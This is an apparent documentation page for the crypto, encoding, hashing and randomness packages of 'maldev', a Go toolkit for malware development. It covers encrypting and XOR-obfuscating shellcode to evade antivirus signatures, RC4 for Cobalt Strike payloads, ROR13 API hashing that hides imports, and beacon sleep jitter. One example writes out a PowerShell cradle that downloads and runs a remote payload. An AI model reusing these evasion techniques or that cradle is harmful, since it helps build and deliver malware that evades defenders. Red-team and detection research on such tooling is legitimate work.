---
last_reviewed: 2026-04-27
reflects_commit: a705c32
---

# Cryptography, Encoding, Hashing, and Randomness

[<- Back to README](../README.md)

The `crypto/`, `encode/`, `hash/`, and `random/` top-level packages in the `core` module provide encryption, encoding, hashing, and CSPRNG utilities used throughout maldev for payload obfuscation, API hashing, and key generation.

---

## crypto/ -- Symmetric Encryption

### EncryptAESGCM

```go
func EncryptAESGCM(key, plaintext []byte) ([]byte, error)
```

**Purpose:** Encrypts data using AES-256-GCM (Galois/Counter Mode).

**Parameters:**
- `key` ([]byte) -- Must be exactly 32 bytes (AES-256).
- `plaintext` ([]byte) -- Data to encrypt.

**Returns:** `nonce || ciphertext || tag` as a single byte slice. The 12-byte nonce is randomly generated and prepended to the output.

**Why AES-GCM:** GCM is an authenticated encryption mode -- it provides both confidentiality and integrity. If an attacker modifies even one byte of the ciphertext, decryption fails with an authentication error rather than silently producing corrupted plaintext. The 16-byte Poly1305-like authentication tag is appended by `gcm.Seal`. AES-GCM is hardware-accelerated on x86 via AES-NI, making it the fastest authenticated cipher on most targets.

**How it works:**
1. Creates an AES-256 block cipher from the key.
2. Wraps it in GCM mode (12-byte nonce, 16-byte tag).
3. Generates a random nonce from `crypto/rand`.
4. Calls `gcm.Seal(nonce, nonce, plaintext, nil)` -- this prepends the nonce to the sealed output.

```go
import "github.com/oioio-space/maldev/crypto"

key, _ := crypto.NewAESKey()
ciphertext, err := crypto.EncryptAESGCM(key, shellcode)
// ciphertext = [12-byte nonce][encrypted data][16-byte tag]
```

### DecryptAESGCM

```go
func DecryptAESGCM(key, ciphertext []byte) ([]byte, error)
```

**Purpose:** Decrypts AES-256-GCM ciphertext produced by `EncryptAESGCM`.

**Parameters:**
- `key` ([]byte) -- The same 32-byte key used for encryption.
- `ciphertext` ([]byte) -- The full output from `EncryptAESGCM` (nonce + ciphertext + tag).

**Returns:** The original plaintext, or an error if the key is wrong or the ciphertext was tampered with.

```go
plaintext, err := crypto.DecryptAESGCM(key, ciphertext)
if err != nil {
    // wrong key or tampered ciphertext
}
```

### NewAESKey

```go
func NewAESKey() ([]byte, error)
```

**Purpose:** Generates a cryptographically random 32-byte key suitable for AES-256.

**Returns:** 32 bytes from `crypto/rand.Reader`.

---

### EncryptChaCha20

```go
func EncryptChaCha20(key, plaintext []byte) ([]byte, error)
```

**Purpose:** Encrypts data using XChaCha20-Poly1305.

**Parameters:**
- `key` ([]byte) -- Must be 32 bytes (`chacha20poly1305.KeySize`).
- `plaintext` ([]byte) -- Data to encrypt.

**Returns:** `nonce || ciphertext || tag`. The 24-byte nonce (XChaCha20 uses an extended nonce) is randomly generated and prepended.

**Why ChaCha20-Poly1305:** Like AES-GCM, this is authenticated encryption. The advantages over AES-GCM:
- **No hardware dependency:** ChaCha20 is a pure ARX (add-rotate-XOR) cipher. On devices without AES-NI (ARM boards, older CPUs), it is significantly faster than AES-GCM.
- **Larger nonce:** XChaCha20's 24-byte nonce makes random nonce collisions astronomically unlikely, even across billions of encryptions with the same key. AES-GCM's 12-byte nonce has a practical limit of ~2^32 encryptions per key.
- **Constant-time by design:** ARX operations are inherently constant-time, eliminating cache-timing side channels that can affect software AES implementations.

```go
import "github.com/oioio-space/maldev/crypto"

key, _ := crypto.NewChaCha20Key()
ciphertext, err := crypto.EncryptChaCha20(key, shellcode)
```

### DecryptChaCha20

```go
func DecryptChaCha20(key, ciphertext []byte) ([]byte, error)
```

**Purpose:** Decrypts XChaCha20-Poly1305 ciphertext produced by `EncryptChaCha20`.

```go
plaintext, err := crypto.DecryptChaCha20(key, ciphertext)
```

### NewChaCha20Key

```go
func NewChaCha20Key() ([]byte, error)
```

**Purpose:** Generates a cryptographically random 32-byte key for XChaCha20-Poly1305.

---

### EncryptRC4

```go
func EncryptRC4(key, data []byte) ([]byte, error)
```

**Purpose:** Encrypts (or decrypts -- RC4 is symmetric XOR) data with RC4.

**Parameters:**
- `key` ([]byte) -- Any length > 0 (typically 16 bytes).
- `data` ([]byte) -- Data to encrypt or decrypt.

**Returns:** The XOR'd output. Calling `EncryptRC4` on the ciphertext with the same key returns the plaintext.

**Why RC4 is included despite being broken:** RC4 has known biases in its keystream and is considered cryptographically broken. It is included solely for compatibility with tools that use RC4, most notably Cobalt Strike's default payload encryption. If you have a choice, use AES-GCM or ChaCha20 instead.

```go
import "github.com/oioio-space/maldev/crypto"

key := []byte("cobalt-strike-key")
encrypted, _ := crypto.EncryptRC4(key, shellcode)
decrypted, _ := crypto.EncryptRC4(key, encrypted) // same function decrypts
```

---

### XORWithRepeatingKey

```go
func XORWithRepeatingKey(data, key []byte) ([]byte, error)
```

**Purpose:** XOR-encrypts data with a repeating key.

**Parameters:**
- `data` ([]byte) -- Input data.
- `key` ([]byte) -- XOR key (must not be empty). The key repeats cyclically: `data[i] ^ key[i % len(key)]`.

**Returns:** The XOR'd output. Applying the same function with the same key decrypts.

**How it works:** For each byte at position `i`, computes `data[i] ^ key[i % keyLen]`. This is a simple substitution cipher -- the key repeats every `len(key)` bytes.

**When to use:** Payload obfuscation to defeat static signature scanning. XOR is not cryptographically secure (trivially broken with known-plaintext or frequency analysis), but it changes every byte of the payload, which is enough to bypass simple byte-pattern matching in AV signatures. For actual secrecy, use AES-GCM or ChaCha20.

```go
import "github.com/oioio-space/maldev/crypto"

key := []byte("hunter2")
obfuscated, _ := crypto.XORWithRepeatingKey(shellcode, key)
// Embed obfuscated in the binary, decode at runtime:
original, _ := crypto.XORWithRepeatingKey(obfuscated, key)
```

---

## encode/ -- Encoding Utilities

### Base64Encode / Base64Decode

```go
func Base64Encode(data []byte) string
func Base64Decode(s string) ([]byte, error)
```

Standard base64 encoding/decoding using Go's `encoding/base64.StdEncoding`.

### Base64URLEncode / Base64URLDecode

```go
func Base64URLEncode(data []byte) string
func Base64URLDecode(data string) ([]byte, error)
```

URL-safe base64 variant (uses `-` and `_` instead of `+` and `/`). Useful for embedding payloads in URLs or HTTP headers.

### ToUTF16LE

```go
func ToUTF16LE(s string) []byte
```

**Purpose:** Converts a Go string (UTF-8) to UTF-16 Little Endian byte representation.

**Why:** Windows APIs use UTF-16LE internally. PowerShell's `-EncodedCommand` parameter expects base64-encoded UTF-16LE. Many Windows shellcode payloads require strings in this format.

**How it works:** Uses `unicode/utf16.Encode` to convert runes to UTF-16 code units, then writes each unit as two bytes in little-endian order.

```go
import "github.com/oioio-space/maldev/encode"

utf16bytes := encode.ToUTF16LE("Hello")
// utf16bytes = [0x48, 0x00, 0x65, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x6F, 0x00]
```

### PowerShell

```go
func PowerShell(script string) string
```

**Purpose:** Encodes a PowerShell script for use with `powershell.exe -EncodedCommand`.

**How it works:** Converts the script to UTF-16LE, then base64-encodes the result. This is exactly the format PowerShell expects.

```go
import "github.com/oioio-space/maldev/encode"

encoded := encode.PowerShell("IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/payload.ps1')")
// Execute: powershell.exe -EncodedCommand <encoded>
```

### ROT13

```go
func ROT13(s string) string
```

**Purpose:** Applies ROT13 substitution cipher to ASCII letters. Non-alphabetic characters pass through unchanged.

**When to use:** Simple string obfuscation. ROT13 is its own inverse (applying it twice returns the original). Useful for hiding command strings from casual inspection.

```go
import "github.com/oioio-space/maldev/encode"

hidden := encode.ROT13("cmd.exe")  // "pzq.rkr"
original := encode.ROT13(hidden)   // "cmd.exe"
```

---

## hash/ -- Hashing

### MD5, SHA1, SHA256, SHA512

```go
func MD5(data []byte) string
func SHA1(data []byte) string
func SHA256(data []byte) string
func SHA512(data []byte) string
```

**Purpose:** Compute hex-encoded hash digests. Convenience wrappers around Go's `crypto/*` packages.

**Returns:** Lowercase hex string.

```go
import "github.com/oioio-space/maldev/hash"

digest := hash.SHA256(shellcode)
// digest = "a1b2c3d4..."
```

### ROR13

```go
func ROR13(name string) uint32
```

**Purpose:** Computes the ROR-13 (Rotate Right by 13 bits) hash of a string.

**Why ROR13 exists:** ROR13 is the canonical API hashing algorithm used in Windows shellcode. Instead of embedding plaintext API names like `"VirtualAlloc"` (which signature scanners flag), shellcode stores the ROR13 hash and resolves functions by walking the PEB export table and comparing hashes at runtime. Nearly every public shellcode framework (Metasploit, Cobalt Strike, Donut) uses this exact algorithm.

**Practical usage in maldev:** The `win/api` package provides `ResolveByHash`, `ModuleByHash`, and `ExportByHash` which implement the PEB walk + export hash comparison using these ROR13 hashes. Pre-computed constants (`api.HashKernel32`, `api.HashLoadLibraryA`, etc.) are provided so the binary contains zero plaintext API names. The `win/syscall.HashGateResolver` uses this internally to resolve SSN numbers without string-based function lookups. See [Syscall Methods](syscalls.md) for details.

**How the algorithm works:**

```text
h = 0
for each byte b in name:
    h = (h >> 13) | (h << 19)   // rotate right by 13 bits (32-bit)
    h = h + b                    // add the byte value
return h
```

The rotation spreads each character's influence across all 32 bits, producing good distribution with minimal collisions for typical API names.

```go
import "github.com/oioio-space/maldev/hash"

h := hash.ROR13("VirtualAlloc")
// Use h in shellcode to resolve the function at runtime
```

### ROR13Module

```go
func ROR13Module(name string) uint32
```

**Purpose:** Computes ROR13 with an appended null terminator, matching the shellcode convention for module name hashing (module names in the PEB are null-terminated).

```go
h := hash.ROR13Module("kernel32.dll")
```

---

## random/ -- Cryptographic Randomness

All functions in this package use `crypto/rand`, not `math/rand`. The output is suitable for cryptographic key generation.

### String

```go
func String(length int) (string, error)
```

**Purpose:** Generates a random alphanumeric string (a-z, A-Z, 0-9).

**When to use:** Generating random file names, mutex names, pipe names, or service names that should not be predictable.

```go
import "github.com/oioio-space/maldev/random"

name, _ := random.String(16) // e.g., "kR7xLm2NpQ4wYz9a"
```

### Bytes

```go
func Bytes(n int) ([]byte, error)
```

**Purpose:** Returns `n` cryptographically random bytes.

**When to use:** Generating encryption keys, nonces, or random padding.

```go
key, _ := random.Bytes(32) // 256-bit key
```

### Int

```go
func Int(min, max int) (int, error)
```

**Purpose:** Returns a random integer in `[min, max)`.

**When to use:** Random sleep jitter, random port selection, random array index.

```go
jitter, _ := random.Int(1000, 5000) // 1-5 seconds in ms
```

### Duration

```go
func Duration(min, max time.Duration) (time.Duration, error)
```

**Purpose:** Returns a random `time.Duration` in `[min, max)`.

**When to use:** Sleep jitter in beacon loops.

```go
import "time"

sleep, _ := random.Duration(5*time.Second, 30*time.Second)
time.Sleep(sleep)
```

---

## Choosing an Encryption Algorithm

| Algorithm | Authenticated | Key Size | Speed (x86) | Speed (ARM) | Use Case |
|-----------|:------------:|:--------:|:-----------:|:-----------:|----------|
| AES-256-GCM | Yes | 32 bytes | Fastest (AES-NI) | Slow | Default choice on x86 |
| XChaCha20-Poly1305 | Yes | 32 bytes | Fast | Fastest | ARM targets, high-volume encryption |
| RC4 | No | Variable | Fast | Fast | Cobalt Strike compatibility only |
| XOR | No | Variable | Fastest | Fastest | Static signature evasion only |
